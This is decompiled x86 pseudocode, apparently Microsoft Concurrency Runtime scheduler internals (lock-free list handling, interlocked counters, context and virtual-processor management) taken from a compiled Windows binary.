int __thiscall sub_4375C6(int *this)
{
  int result; // eax
  int v2; // esi

  result = *this;
  if ( *this )
  {
    v2 = *(_DWORD *)(result + 4);
    if ( result == v2 )
    {
      *this = 0;
    }
    else
    {
      *(_DWORD *)(*(_DWORD *)(v2 + 4) + 8) = result;
      *(_DWORD *)(*this + 4) = *(_DWORD *)(v2 + 4);
    }
    return v2;
  }
  return result;
}

//----- (004375EE) --------------------------------------------------------
_DWORD *__thiscall sub_4375EE(_DWORD *this)
{
  _DWORD *result; // eax
  _DWORD *v2; // esi

  result = (_DWORD *)*this;
  if ( *this )
  {
    v2 = (_DWORD *)*result;
    if ( result == (_DWORD *)*result )
    {
      *this = 0;
    }
    else
    {
      *(_DWORD *)(*v2 + 4) = result;
      *(_DWORD *)*this = *v2;
    }
    return v2;
  }
  return result;
}

//----- (00437612) --------------------------------------------------------
_DWORD *__thiscall sub_437612(int this)
{
  volatile signed __int32 *v2; // esi
  _DWORD *v3; // edi

  v2 = (volatile signed __int32 *)(this + 4);
  sub_42E793((volatile signed __int32 *)(this + 4));
  v3 = sub_4375EE((_DWORD *)this);
  sub_42E8AD(v2);
  return v3;
}

//----- (00437646) --------------------------------------------------------
void __thiscall sub_437646(int this, int a2)
{
  volatile signed __int32 *v3; // edi

  v3 = (volatile signed __int32 *)(this + 308);
  sub_42E793((volatile signed __int32 *)(this + 308));
  if ( *(_DWORD *)(a2 + 12) == 2 )
    sub_4373A2((int *)(this + 304), a2);
  *(_DWORD *)(a2 + 12) = 0;
  sub_42E8AD(v3);
}

//----- (00437682) --------------------------------------------------------
char __thiscall sub_437682(union _SLIST_HEADER *this, int a2)
{
  return sub_4374CD(this + 12, (struct _SINGLE_LIST_ENTRY *)a2, *(_DWORD *)(a2 + 24), 1);
}

//----- (0043769A) --------------------------------------------------------
char __thiscall sub_43769A(_DWORD *this)
{
  char result; // al

  result = sub_440680(this);
  this[14] = 0;
  return result;
}

//----- (004376A8) --------------------------------------------------------
int __thiscall sub_4376A8(_DWORD *this, int a2, unsigned int a3)
{
  int result; // eax
  unsigned int v4; // ebx
  int v5; // edi
  int v6; // eax
  int v7; // eax
  int (__thiscall ***v8)(_DWORD); // ebx
  int v9; // edi
  int v10; // eax
  char v11[4]; // [esp+0h] [ebp-1Ch] BYREF
  char pExceptionObject[4]; // [esp+4h] [ebp-18h] BYREF
  int v13; // [esp+8h] [ebp-14h]
  int (*v14)(); // [esp+Ch] [ebp-10h]
  _DWORD *v15; // [esp+10h] [ebp-Ch]
  unsigned int v16; // [esp+14h] [ebp-8h]
  int (__thiscall ***v17)(_DWORD); // [esp+18h] [ebp-4h]

  result = a2;
  v15 = this;
  if ( !a2 )
  {
    sub_429626((std::exception *)pExceptionObject, "ppVirtualProcessorRoots");
LABEL_17:
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !a3 )
  {
    sub_429626((std::exception *)pExceptionObject, "count");
    goto LABEL_17;
  }
  v4 = 0;
  v16 = 0;
  do
  {
    v5 = this[8];
    v17 = *(int (__thiscall ****)(_DWORD))(result + 4 * v4);
    v6 = (**v17)(v17);
    v7 = sub_43DA31(*(_DWORD **)(v5 + 4 * v6), (int)v17);
    if ( !v7 )
    {
      v8 = v17;
      do
      {
        v13 = 0;
        v14 = sub_43055D;
        while ( sub_42E8F5((int)v11) )
          ;
        SwitchToThread();
        v9 = v15[8];
        v10 = (**v8)(v8);
        v7 = sub_43DA31(*(_DWORD **)(v9 + 4 * v10), (int)v8);
      }
      while ( !v7 );
      v4 = v16;
    }
    if ( !*(_BYTE *)(v7 + 172) || (v7 = sub_43E6B7(*(volatile signed __int32 **)(v7 + 176), v7)) != 0 )
      sub_43D005((_BYTE *)v7);
    result = a2;
    ++v4;
    this = v15;
    v16 = v4;
  }
  while ( v4 < a3 );
  return result;
}
// 4376A8: using guessed type char var_1C[4];
// 4376A8: using guessed type char pExceptionObject[4];

//----- (00437798) --------------------------------------------------------
signed __int32 __thiscall sub_437798(volatile signed __int32 *this)
{
  volatile signed __int32 *v2; // ebx
  int v3; // esi
  signed __int32 result; // eax
  signed __int32 v5; // edx

  v2 = this + 101;
  v3 = sub_437942((int *)this + 101, 0x80000000);
  result = _InterlockedCompareExchange(v2, v3 & 0x7FFFFFFF, v3);
  if ( result != v3 )
  {
    do
    {
      v5 = result;
      result = _InterlockedCompareExchange(v2, result & 0x7FFFFFFF, result);
    }
    while ( result != v5 );
  }
  _InterlockedIncrement(this + 98);
  return result;
}

//----- (004377DF) --------------------------------------------------------
char *__cdecl sub_4377DF(char *ListEntry)
{
  if ( ListEntry[772] )
    _InterlockedDecrement(dword_4927FC);
  if ( QueryDepthSList(&ListHead) >= 0x10u )
    return sub_434F69(ListEntry, 1);
  else
    return (char *)InterlockedPushEntrySList(&ListHead, (PSLIST_ENTRY)ListEntry);
}
// 4927FC: using guessed type signed __int32 dword_4927FC[3];

//----- (00437820) --------------------------------------------------------
LPVOID sub_437820()
{
  if ( dword_48C354 >= 0 )
    return 0;
  else
    return sub_430184(dword_4927F0);
}
// 48C354: using guessed type int dword_48C354;

//----- (0043783C) --------------------------------------------------------
char __thiscall sub_43783C(volatile signed __int32 *this)
{
  volatile signed __int32 *v1; // esi
  signed __int32 v2; // edx

  v1 = this + 96;
  while ( *v1 )
  {
    v2 = *v1;
    if ( _InterlockedCompareExchange(v1, v2 + 1, v2) == v2 )
      return 1;
  }
  return 0;
}

//----- (0043785E) --------------------------------------------------------
int __thiscall sub_43785E(_DWORD *this, int a2, int a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // esi
  int (__thiscall ***v6)(_DWORD, int, int); // edi

  v4 = sub_430184(dword_4927F0);
  v5 = v4;
  if ( v4 && (_DWORD *)sub_41DA3D(v4) == this )
    v6 = (int (__thiscall ***)(_DWORD, int, int))sub_438AF9(v5);
  else
    v6 = (int (__thiscall ***)(_DWORD, int, int))this[44];
  return (**v6)(v6, a2, a3);
}

//----- (004378AF) --------------------------------------------------------
int __thiscall sub_4378AF(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3, int a4)
{
  _DWORD *v5; // eax
  _DWORD *v6; // esi
  void *v7; // eax

  v5 = sub_430184(dword_4927F0);
  v6 = v5;
  if ( v5 && (_DWORD *)sub_41DA3D(v5) == this )
    v7 = (void *)sub_438AF9(v6);
  else
    v7 = (void *)this[44];
  return sub_440728(v7, a2, a3, a4);
}

//----- (004378EC) --------------------------------------------------------
void __thiscall sub_4378EC(_DWORD *this, int a2)
{
  if ( this[3] == 1 )
    this[94] = sub_436211(this, *(_DWORD *)(a2 + 184));
}

//----- (00437911) --------------------------------------------------------
int __cdecl sub_437911(int *a1, int a2)
{
  int result; // eax
  char v3[8]; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+10h] [ebp-8h]
  void (*v5)(); // [esp+14h] [ebp-4h]

  result = *a1;
  if ( (*a1 & a2) != 0 )
  {
    v4 = 0;
    v5 = sub_43051F;
    do
    {
      sub_42E8F5((int)v3);
      result = *a1;
    }
    while ( (*a1 & a2) != 0 );
  }
  return result;
}
// 437911: using guessed type char var_10[8];

//----- (00437942) --------------------------------------------------------
int __cdecl sub_437942(int *a1, int a2)
{
  int v2; // edx
  char v4[8]; // [esp+4h] [ebp-10h] BYREF
  int v5; // [esp+Ch] [ebp-8h]
  void (*v6)(); // [esp+10h] [ebp-4h]

  v2 = *a1;
  if ( (a2 & *a1) != a2 )
  {
    v5 = 0;
    v6 = sub_43051F;
    do
    {
      sub_42E8F5((int)v4);
      v2 = *a1;
    }
    while ( (a2 & *a1) != a2 );
  }
  return v2;
}
// 437942: using guessed type char var_10[8];

//----- (0043797C) --------------------------------------------------------
char __thiscall sub_43797C(unsigned int *this, int a2, int a3, int a4, int a5, int a6)
{
  int v8[4]; // [esp-14h] [ebp-1Ch] BYREF
  int v9; // [esp-4h] [ebp-Ch]

  v9 = 3;
  sub_4380FD(v8, &a3);
  return sub_4379A2(this, a2, v8[0], v8[1], v8[2], v8[3], v9);
}

//----- (004379A2) --------------------------------------------------------
char __thiscall sub_4379A2(unsigned int *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  char v8; // bl
  int v10[4]; // [esp-14h] [ebp-28h] BYREF
  int v11; // [esp-4h] [ebp-18h]
  __int32 v12[3]; // [esp+8h] [ebp-Ch] BYREF

  v8 = 0;
  sub_438FB0();
  v11 = a7;
  v12[0] = 0;
  sub_4380FD(v10, &a3);
  if ( sub_435C54(this, v12, v10[0], v10[1], v10[2], v10[3], v11) )
  {
    sub_43CCA4((_DWORD **)v12[1], v12[0], a2, 0);
    v12[0] = 0;
    v8 = 1;
  }
  sub_438FB0();
  return v8;
}
// 438FB0: using guessed type int sub_438FB0(void);

//----- (004379F7) --------------------------------------------------------
char *sub_4379F7()
{
  char *result; // eax

  result = (char *)sub_4304E3(&dword_492810);
  if ( !--dword_4927F8 )
  {
    sub_43C908();
    while ( 1 )
    {
      result = (char *)InterlockedPopEntrySList(&ListHead);
      if ( !result )
        break;
      sub_434F69(result, 1);
    }
  }
  dword_492810 = 0;
  return result;
}
// 4927F8: using guessed type int dword_4927F8;
// 492810: using guessed type int dword_492810;

//----- (00437A4D) --------------------------------------------------------
union _SLIST_HEADER *__thiscall sub_437A4D(union _SLIST_HEADER *this, _DWORD *a2, _DWORD *a3, union _SLIST_HEADER *a4)
{
  union _SLIST_HEADER *v4; // esi
  int v5; // edi
  struct _SINGLE_LIST_ENTRY *Next; // ebx
  int v7; // esi
  struct _SINGLE_LIST_ENTRY *v8; // eax
  _DWORD *v9; // eax
  int v10; // edx
  int v11; // eax
  int v12; // ecx
  int v13; // ebx
  int v14; // edx
  int v15; // ecx
  union _SLIST_HEADER *result; // eax
  struct _SINGLE_LIST_ENTRY *v17; // eax
  struct _SINGLE_LIST_ENTRY *v18; // edi
  int v19; // edx
  struct _SINGLE_LIST_ENTRY *v20; // eax
  int v21; // ecx
  _DWORD *v23; // [esp+10h] [ebp-8h]
  int i; // [esp+14h] [ebp-4h]

  v4 = this;
  v5 = 0;
  for ( i = 0; v5 < *(_DWORD *)&v4[5].Depth; i = v5 )
  {
    Next = v4[4].Next.Next[v5].Next;
    if ( Next && (int)Next[30].Next > 0 )
    {
      v7 = 0;
      v8 = Next + 14;
      do
      {
        v9 = (_DWORD *)sub_434DA3(v8, v7);
        v23 = v9;
        if ( v9 )
        {
          v10 = v9[26] - v9[28];
          v9[28] = v9[26];
          v11 = v9[27];
          v12 = v11 - v23[29];
          v23[29] = v11;
          *a3 += v10;
          *a2 += v12;
          a4->Next.Next = (struct _SINGLE_LIST_ENTRY *)((char *)a4->Next.Next + v10 - v12);
        }
        ++v7;
        v8 = Next + 14;
      }
      while ( v7 < (int)Next[30].Next );
      v4 = this;
      v5 = i;
    }
    ++v5;
  }
  v13 = 0;
  v14 = *(_DWORD *)&v4[55].Depth - *(_DWORD *)&v4[56].Depth;
  *(_DWORD *)&v4[56].Depth = *(_DWORD *)&v4[55].Depth;
  v15 = (char *)v4[56].Next.Next - (char *)v4[57].Next.Next;
  v4[57].Next.Next = v4[56].Next.Next;
  *a3 += v14;
  *a2 += v15;
  result = a4;
  a4->Next.Next = (struct _SINGLE_LIST_ENTRY *)((char *)a4->Next.Next + v14 - v15);
  if ( (int)v4[33].Next.Next > 0 )
  {
    result = v4 + 25;
    do
    {
      v17 = (struct _SINGLE_LIST_ENTRY *)sub_434DA3(result, v13);
      v18 = v17;
      if ( v17 )
      {
        v19 = (char *)v17[2].Next - (char *)v17[4].Next;
        v20 = v17[3].Next;
        v18[4].Next = v18[2].Next;
        v21 = (char *)v20 - (char *)v18[5].Next;
        v18[5].Next = v20;
        *a3 += v19;
        *a2 += v21;
        a4->Next.Next = (struct _SINGLE_LIST_ENTRY *)((char *)a4->Next.Next + v19 - v21);
        if ( !sub_436BBC(v18) )
        {
          sub_4373D4(v4 + 25, v18, (int)v18->Next, 0);
          sub_42CF7C(v18);
        }
      }
      ++v13;
      result = v4 + 25;
    }
    while ( v13 < (int)v4[33].Next.Next );
  }
  return result;
}

//----- (00437B89) --------------------------------------------------------
int __thiscall sub_437B89(volatile signed __int32 *this)
{
  _BYTE *v2; // eax
  int v3; // eax
  int result; // eax
  signed __int32 v5; // eax
  signed __int32 v6; // edx
  char v7; // [esp+Bh] [ebp-1h]

  v2 = sub_430184(dword_4927F0);
  v7 = 1;
  if ( v2 && !v2[76] )
  {
    v7 = 0;
    UserMathErrorFunction();
  }
  v3 = (*(int (__thiscall **)(volatile signed __int32 *))(*this + 72))(this);
  if ( v3 )
  {
    if ( v3 == 2 && !*((_DWORD *)this + 102) )
      _InterlockedExchange(this + 102, 1);
    v5 = *((_DWORD *)this + 101);
    do
    {
      v6 = v5;
      v5 = _InterlockedCompareExchange(this + 101, v5 & 0xBFFFFFFF, v5);
    }
    while ( v5 != v6 );
    result = sub_437384((HANDLE *)this, v5 & 0x1FFFFFFF);
  }
  else
  {
    result = sub_436F4A((int)this);
  }
  if ( !v7 )
    return UserMathErrorFunction();
  return result;
}

//----- (00437C25) --------------------------------------------------------
char __thiscall sub_437C25(_DWORD *this)
{
  char result; // al
  volatile signed __int32 *v3; // ebx
  struct _SINGLE_LIST_ENTRY *i; // eax
  char v5; // dl
  char v6; // al
  volatile signed __int32 v7; // ecx
  int v8; // esi
  unsigned int v9; // esi
  int TickCount64; // eax
  ULONG v11; // eax
  int v12[4]; // [esp-14h] [ebp-3Ch] BYREF
  int v13; // [esp-4h] [ebp-2Ch]
  int v14[6]; // [esp+Ch] [ebp-1Ch] BYREF
  char v15; // [esp+26h] [ebp-2h]
  char v16; // [esp+27h] [ebp-1h]

  result = 0;
  v3 = this + 121;
  if ( (int)this[121] <= 0 )
    return result;
  v16 = 0;
  v15 = 0;
  for ( i = (struct _SINGLE_LIST_ENTRY *)sub_43600C((int)this, 0);
        ;
        i = (struct _SINGLE_LIST_ENTRY *)sub_43600C((int)this, 0) )
  {
    if ( !i )
    {
      v5 = v16;
      v6 = 1;
      v15 = 1;
      goto LABEL_10;
    }
    v5 = sub_436C69((int)this, i) | v16;
    v16 = v5;
    if ( (int)this[110] <= 0 )
      break;
    if ( sub_437D94(this, 1) )
    {
      v5 = v16;
      break;
    }
  }
  v6 = v15;
LABEL_10:
  if ( !this[102] && (v6 || (int)this[110] > 0) )
    goto LABEL_17;
  v7 = *v3;
  result = _InterlockedExchangeAdd(v3, -*v3) != v7;
  if ( !result )
  {
    if ( !this[102] )
      return result;
    if ( v5 )
      return result;
    v13 = 11;
    v8 = *(_DWORD *)(sub_4361F0(this) + 8);
    memset(v14, 0, 16);
    sub_4380FD(v12, v14);
    result = sub_4379A2(this, v8, v12[0], v12[1], v12[2], v12[3], v13);
    if ( result )
      return result;
LABEL_17:
    _InterlockedExchange(v3, 1);
  }
  v9 = sub_437D94(this, 1);
  TickCount64 = j____crtGetTickCount64();
  v11 = TickCount64 - this[116] < v9 ? v9 - (TickCount64 - this[116]) : 0;
  if ( v15 )
  {
    if ( v11 < 0x1F4 )
      v11 = 500;
  }
  return sub_435442(this, v11);
}
// 43001E: using guessed type int j____crtGetTickCount64(void);

//----- (00437D3B) --------------------------------------------------------
char __stdcall sub_437D3B(int a1, _DWORD *a2, int a3)
{
  return sub_437C25(a2);
}

//----- (00437D4A) --------------------------------------------------------
char __stdcall sub_437D4A(_DWORD *a1, int a2)
{
  return sub_437C25(a1);
}

//----- (00437D59) --------------------------------------------------------
void __stdcall Callback(_DWORD *a1, BOOLEAN a2)
{
  unsigned int v2; // esi
  unsigned int v3; // eax

  v2 = sub_437D94(a1, 1);
  v3 = j____crtGetTickCount64() - a1[116];
  if ( v3 >= v2 )
    sub_437C25(a1);
  else
    sub_435442(a1, v2 - v3);
}
// 43001E: using guessed type int j____crtGetTickCount64(void);

//----- (00437D94) --------------------------------------------------------
int __thiscall sub_437D94(_DWORD *this, int a2)
{
  unsigned int v2; // eax
  unsigned int v3; // ecx
  unsigned int v5; // eax
  int v6; // eax

  v2 = this[100];
  v3 = this[115];
  if ( v2 < v3 )
    return 0;
  v5 = v2 - v3;
  if ( v5 >= 0x64 )
  {
    if ( v5 >= 0x12C )
    {
      if ( v5 >= 0x258 )
      {
        if ( v5 >= 0x5DC )
        {
          if ( v5 >= 0x9C4 )
          {
            if ( v5 >= 0xFA0 )
              v6 = (v5 >> 1) + 8200;
            else
              v6 = v5 / 3 + 2500;
          }
          else
          {
            v6 = v5 / 3 + 555;
          }
        }
        else
        {
          v6 = (v5 >> 2) + 180;
        }
      }
      else
      {
        v6 = v5 / 5 + 60;
      }
    }
    else
    {
      v6 = (v5 >> 3) + 15;
    }
  }
  else
  {
    v6 = v5 / 0xA + 5;
  }
  return a2 * v6;
}

//----- (00437E2B) --------------------------------------------------------
int __cdecl sub_437E2B(char a1, char a2, int a3)
{
  int result; // eax
  _DWORD v4[16]; // [esp+4h] [ebp-40h] BYREF

  if ( dword_492850 )
  {
    memset((char *)v4 + 2, 0, 0x3Eu);
    v4[11] = 0x20000;
    LOWORD(v4[0]) = 64;
    LOBYTE(v4[1]) = a1;
    BYTE1(v4[1]) = a2;
    v4[6] = dword_471444[0];
    v4[7] = dword_471444[1];
    v4[8] = dword_471444[2];
    v4[9] = dword_471444[3];
    v4[13] = a3;
    return sub_43C82A(dword_492850, dword_492848, dword_49284C, (int)v4);
  }
  return result;
}
// 471444: using guessed type _DWORD dword_471444[4];
// 492848: using guessed type int dword_492848;
// 49284C: using guessed type int dword_49284C;

//----- (00437E96) --------------------------------------------------------
int __stdcall sub_437E96(char a1, unsigned __int8 a2, int a3)
{
  int result; // eax

  if ( a2 <= (unsigned __int8)byte_492844 )
  {
    result = dword_492840;
    if ( (dword_492840 & 1) != 0 )
      return sub_437E2B(a1, a2, a3);
  }
  return result;
}
// 492840: using guessed type int dword_492840;
// 492844: using guessed type char byte_492844;

//----- (00437EC0) --------------------------------------------------------
int __thiscall sub_437EC0(int this, _DWORD *a2)
{
  _DWORD *v3; // edi

  v3 = (_DWORD *)(this + 324);
  sub_4304D3((volatile __int32 *)(this + 324));
  if ( *a2 != *(_DWORD *)(this + 336) )
    sub_436FE7((volatile signed __int32 *)this);
  return sub_430514(v3);
}

//----- (00437EF5) --------------------------------------------------------
int __thiscall sub_437EF5(_DWORD *this)
{
  if ( sub_435D5C(this) || sub_435D86(this) )
    return 1;
  if ( (int)this[121] <= 0 )
    return 0;
  return 2;
}

//----- (00437F23) --------------------------------------------------------
int __thiscall sub_437F23(_DWORD *this, int a2)
{
  if ( a2 == -1 )
  {
    this[85] = 0;
    this[86] = sub_43574C(this);
  }
  else
  {
    this[85] = a2;
  }
  if ( this[85] == this[86] )
    return 0;
  else
    return this[86];
}

//----- (00437F6B) --------------------------------------------------------
unsigned int __thiscall sub_437F6B(_DWORD *this)
{
  unsigned int v2; // ecx
  unsigned int result; // eax

  v2 = sub_43574C(this);
  if ( v2 <= this[86] )
    return 0;
  if ( this[86] == this[85] )
    result = v2;
  else
    result = 0;
  this[86] = v2;
  return result;
}

//----- (00437F9D) --------------------------------------------------------
char __thiscall sub_437F9D(volatile signed __int32 *this, int a2)
{
  volatile signed __int32 *v3; // esi
  signed __int32 v4; // eax
  int v5; // edx

  if ( (_BYTE)a2 )
  {
    v3 = this + 101;
    v4 = *((_DWORD *)this + 101);
    while ( 1 )
    {
      v5 = v4;
      if ( (v4 & 0x40000000) != 0 )
        v5 = sub_437911((int *)this + 101, 0x40000000);
      if ( (v5 & 0x20000000) != 0 )
        break;
      v4 = _InterlockedCompareExchange(v3, v5 + 1, v5);
      if ( v4 == v5 )
      {
        (*(void (__thiscall **)(volatile signed __int32 *, int, signed __int32))(*this + 68))(
          this,
          a2,
          _InterlockedIncrement(this + 108));
        return 1;
      }
    }
    return 0;
  }
  else
  {
    (*(void (__thiscall **)(volatile signed __int32 *, _DWORD, signed __int32))(*this + 68))(
      this,
      0,
      _InterlockedDecrement(this + 108));
    if ( (_InterlockedDecrement(this + 101) & 0x9FFFFFFF) == 0x80000000 )
      sub_4353E1(this);
    return 1;
  }
}

//----- (00438051) --------------------------------------------------------
int __thiscall sub_438051(int this, char a2)
{
  volatile signed __int32 *v3; // ecx

  sub_438FB0();
  v3 = (volatile signed __int32 *)(this + 404);
  if ( a2 )
  {
    if ( (_InterlockedDecrement(v3) & 0x9FFFFFFF) == 0x80000000 )
      sub_4353E1((volatile signed __int32 *)this);
  }
  else if ( (_InterlockedIncrement(v3) & 0x40000000) != 0 )
  {
    WaitForSingleObjectEx(*(HANDLE *)(this + 380), 0xFFFFFFFF, 0);
  }
  return sub_438FB0();
}
// 438FB0: using guessed type int sub_438FB0(void);

//----- (004380AE) --------------------------------------------------------
void __thiscall sub_4380AE(int *this)
{
  int v2; // eax
  int i; // ebx
  _DWORD *v4; // eax
  _DWORD *v5; // esi

  if ( this[1] > 0 )
  {
    v2 = *this;
    for ( i = 0; i < *this; ++i )
    {
      v4 = *(_DWORD **)(this[2] + 4 * i);
      if ( v4 )
      {
        do
        {
          v5 = (_DWORD *)*v4;
          sub_42CF7C(v4);
          v4 = v5;
        }
        while ( v5 );
      }
      v2 = *this;
    }
    this[1] = 0;
    memset((void *)this[2], 0, 4 * v2);
  }
}

//----- (004380FD) --------------------------------------------------------
int __thiscall sub_4380FD(int *this, _DWORD *a2)
{
  int result; // eax

  *this ^= (*this ^ *a2) & 0xFFFFFFF;
  *this = *a2 ^ (*this ^ *a2) & 0xFFFFFFF;
  this[2] = a2[2];
  this[1] = a2[1];
  result = a2[3];
  this[3] = result;
  return result;
}

//----- (00438132) --------------------------------------------------------
_DWORD *__thiscall sub_438132(_DWORD *this)
{
  *this = 0;
  this[1] = 0;
  this[2] = unknown_libname_45(16);
  return this;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (0043814B) --------------------------------------------------------
void *__thiscall sub_43814B(void *this, int a2, char a3)
{
  signed __int32 v4; // eax
  int v5; // edi
  int v6; // ebx
  int v7; // eax

  *((_DWORD *)this + 15) = -1;
  *((_DWORD *)this + 7) = a2;
  *(_DWORD *)this = &Concurrency::details::ContextBase::`vftable';
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 5) = 0;
  *((_DWORD *)this + 8) = 0;
  *((_DWORD *)this + 9) = 0;
  *((_DWORD *)this + 10) = 1;
  *((_DWORD *)this + 11) = 0;
  *((_DWORD *)this + 12) = 0;
  *((_DWORD *)this + 13) = 0;
  *((_DWORD *)this + 14) = 0;
  *((_DWORD *)this + 16) = 0;
  *((_DWORD *)this + 17) = 0;
  *((_BYTE *)this + 76) = a3;
  *((_DWORD *)this + 20) = 0;
  sub_42E462((_DWORD *)this + 21);
  *((_DWORD *)this + 25) = 0;
  *((_DWORD *)this + 26) = -1;
  *((_DWORD *)this + 27) = -1;
  *((_DWORD *)this + 28) = 0;
  *((_DWORD *)this + 29) = 0;
  *((_DWORD *)this + 30) = 0;
  *((_DWORD *)this + 31) = 0;
  sub_434608((unsigned int *)this + 32, 7u);
  sub_438132((_DWORD *)this + 35);
  v4 = sub_43612F(*((volatile signed __int32 **)this + 7));
  v5 = *((_DWORD *)this + 7);
  v6 = v4;
  *((_DWORD *)this + 2) = v4;
  v7 = (*(int (__thiscall **)(int))(*(_DWORD *)v5 + 4))(v5);
  sub_43914D(1, 4u, v7, v6);
  return this;
}
// 471110: using guessed type void *Concurrency::details::ContextBase::`vftable';

//----- (00438221) --------------------------------------------------------
void __thiscall sub_438221(void **this)
{
  j_j_j___free_base(this[3]);
  j_j_j___free_base(this[4]);
}

//----- (00438238) --------------------------------------------------------
void __thiscall sub_438238(void **this)
{
  j_j_j___free_base(this[7]);
  j_j_j___free_base(this[8]);
}

//----- (0043824F) --------------------------------------------------------
void __thiscall sub_43824F(int this)
{
  int v2; // edi
  int v3; // esi

  if ( *(int *)(this + 4) > 0 )
  {
    v2 = **(_DWORD **)(this + 8);
    if ( v2 )
    {
      do
      {
        v3 = *(_DWORD *)(v2 + 4);
        j_j_j___free_base(*(void **)v2);
        sub_42CF7C((void *)v2);
        v2 = v3;
      }
      while ( v3 );
    }
  }
  j_j_j___free_base(*(void **)(this + 8));
}

//----- (0043828B) --------------------------------------------------------
void __thiscall sub_43828B(_DWORD *this)
{
  *this = &Concurrency::Context::`vftable';
}
// 4710F4: using guessed type void *Concurrency::Context::`vftable';

//----- (00438292) --------------------------------------------------------
void __thiscall sub_438292(void *this)
{
  sub_43824F((int)this + 140);
  sub_4380AE((int *)this + 32);
  j_j_j___free_base(*((void **)this + 34));
  *(_DWORD *)this = &Concurrency::Context::`vftable';
}
// 4710F4: using guessed type void *Concurrency::Context::`vftable';

//----- (004382C0) --------------------------------------------------------
void __thiscall sub_4382C0(void **this)
{
  j_j_j___free_base(this[3]);
  j_j_j___free_base(this[2]);
}

//----- (004382D7) --------------------------------------------------------
void __thiscall sub_4382D7(void *this)
{
  sub_42E8A9((volatile signed __int32 *)(*(_DWORD *)this + 4));
}

//----- (00438310) --------------------------------------------------------
bool __thiscall sub_438310(_DWORD *this, _DWORD *a2)
{
  return ((*this ^ *a2) & 0xFFFFFFF) == 0 && this[2] == a2[2];
}

//----- (00438333) --------------------------------------------------------
int __thiscall sub_438333(_DWORD *this, int a2)
{
  int v2; // ecx
  int v3; // eax
  _DWORD *v4; // ecx
  int v5; // eax

  v2 = this[2];
  v3 = a2 >> 4;
  if ( a2 >> 4 >= 4 )
  {
    v4 = *(_DWORD **)(v2 + 12);
    v5 = v3 - 3;
    do
    {
      v4 = (_DWORD *)v4[1];
      --v5;
    }
    while ( v5 );
  }
  else
  {
    v4 = *(_DWORD **)(v2 + 4 * v3);
  }
  return *v4 + 8 * (a2 & 0xF);
}

//----- (00438365) --------------------------------------------------------
_DWORD *__thiscall sub_438365(_DWORD *Block, char a2)
{
  *Block = &Concurrency::Context::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 4710F4: using guessed type void *Concurrency::Context::`vftable';

//----- (00438388) --------------------------------------------------------
void *__thiscall sub_438388(void *Block, char a2)
{
  sub_438292(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (004383AD) --------------------------------------------------------
void **__thiscall sub_4383AD(void **Block, char a2)
{
  sub_438238(Block + 19);
  sub_438221(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (004383D9) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_4383D9(_DWORD *this, signed __int32 a2)
{
  _DWORD *v2; // esi
  volatile signed __int32 *v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // eax
  signed __int32 v6; // edx
  signed __int32 v7; // eax
  char v8; // al
  volatile __int32 *v9; // edi
  void *v10; // eax
  int *v11; // ecx
  int v12; // eax
  int v13; // edx
  size_t v15; // [esp-8h] [ebp-38h]
  char v16[8]; // [esp+Ch] [ebp-24h] BYREF
  int v17; // [esp+14h] [ebp-1Ch]
  int (*v18)(); // [esp+18h] [ebp-18h]
  int v19; // [esp+1Ch] [ebp-14h]
  volatile signed __int32 *v20; // [esp+20h] [ebp-10h]
  _DWORD *v21; // [esp+24h] [ebp-Ch]
  volatile signed __int32 *v22; // [esp+28h] [ebp-8h]
  char v23; // [esp+2Fh] [ebp-1h]

  v2 = this;
  v23 = 0;
  v21 = this;
  v3 = 0;
  v4 = this[12];
  do
  {
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v5 = *(volatile signed __int32 **)v4;
    v6 = 0;
    v22 = *(volatile signed __int32 **)v4;
    if ( (int)v2[10] <= 0 )
    {
LABEL_8:
      v8 = v23;
      if ( v23 )
        goto LABEL_25;
LABEL_9:
      _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -2, -1);
      v22 = (volatile signed __int32 *)((char *)v3 + v2[10]);
      v9 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v9, 1, 0) )
      {
        v10 = (void *)unknown_libname_45((unsigned __int64)(unsigned int)v2[10] >> 30 != 0 ? -1 : 4 * v2[10]);
        v15 = 4 * v2[10];
        v19 = (int)v10;
        memset(v10, 0, v15);
        v11 = (int *)operator new(0xCu);
        v20 = v11;
        if ( v11 )
        {
          v12 = v19;
          v11[1] = 0;
          v11[2] = -1;
          *v11 = v12;
        }
        else
        {
          v11 = 0;
        }
        v13 = v2[15];
        if ( v13 < v2[14] )
        {
          *(_DWORD *)(v2[13] + 4 * v13) = v11;
          ++v2[15];
        }
        _InterlockedExchange(v9, (__int32)v11);
      }
      if ( *v9 == 1 )
      {
        v17 = 0;
        v18 = sub_43055D;
        do
          sub_42E8F5((int)v16);
        while ( *v9 == 1 );
      }
      v3 = v22;
      goto LABEL_24;
    }
    while ( *v5 )
    {
LABEL_7:
      ++v6;
      v22 = ++v5;
      if ( v6 >= v2[10] )
        goto LABEL_8;
    }
    v20 = (volatile signed __int32 *)((char *)v3 + v6);
    *(_DWORD *)(a2 + 68) = (char *)v3 + v6;
    v19 = v2[16];
    v7 = _InterlockedCompareExchange(v22, a2, 0);
    v2 = v21;
    if ( v7 )
    {
      v5 = v22;
      goto LABEL_7;
    }
    v3 = v20;
    v23 = 1;
    if ( (int)v20 >= v19 )
      _InterlockedIncrement(v21 + 16);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v6);
LABEL_24:
    v8 = v23;
LABEL_25:
    v4 = *(_DWORD *)(v4 + 4);
  }
  while ( !v8 );
  return v3;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);
